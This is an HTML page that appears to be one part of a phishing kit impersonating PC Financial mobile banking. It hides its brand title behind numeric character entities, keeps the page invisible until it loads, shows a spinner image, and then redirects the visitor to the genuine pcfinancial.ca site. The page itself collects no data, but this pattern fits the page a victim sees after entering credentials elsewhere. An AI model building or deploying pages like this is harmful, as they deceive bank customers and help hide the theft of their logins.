<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#67;&#70;&#32;&#77;&#111;&#98;&#105;&#108;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <html><meta http-equiv="Refresh" content="05; url=https://www.pcfinancial.ca/"></html>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:514px; width:1349px; height:303px; z-index:0"><img src="images/fa4.png" alt="" title="" border=0 width=1349 height=303></div>

<div id="image7" style="position:absolute; overflow:hidden; left:214px; top:593px; width:911px; height:151px; z-index:1"><a href="#"><img src="images/fa5.png" alt="" title="" border=0 width=911 height=151></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:213px; top:14px; width:950px; height:194px; z-index:2"><img src="images/fa20.png" alt="" title="" border=0 width=950 height=194></div>

<div id="image2" style="position:absolute; overflow:hidden; left:662px; top:305px; width:48px; height:48px; z-index:3"><img src="images/stf.gif" alt="" title="" border=0 width=48 height=48></div>

</div>

</body>
</html>